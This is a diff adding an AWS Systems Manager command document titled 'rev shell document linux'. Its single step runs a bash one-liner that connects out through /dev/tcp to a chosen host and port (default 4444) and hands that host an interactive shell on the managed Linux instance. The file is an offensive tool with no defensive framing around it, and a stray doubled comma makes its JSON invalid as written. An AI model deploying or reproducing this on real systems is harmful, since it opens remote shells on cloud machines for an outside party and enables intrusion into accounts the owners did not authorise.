@@ -1,0 +1,26 @@
+{
+  "schemaVersion": "2.2",
+  "description": "rev shell document linux",
+  "parameters": {
+    "host": {
+      "description": "(Required) Specify the host.",
+      "type": "String"
+    },
+    "port": {
+      "description": "(Optional) Specify the port. The default value is 4444.",
+      "type": "String",
+      "default": "4444"
+    }
+  },
+  "mainSteps": [
+    {
+      "action": "aws:runShellScript",
+      "name": "get reverse shell",,
+      "inputs": {
+        "runCommand": [
+          "0<&196;exec 196<>/dev/tcp/{{ host }}/{{ port }}; sh <&196 >&196 2>&196"
+        ]
+      }
+    }
+  ]
+}
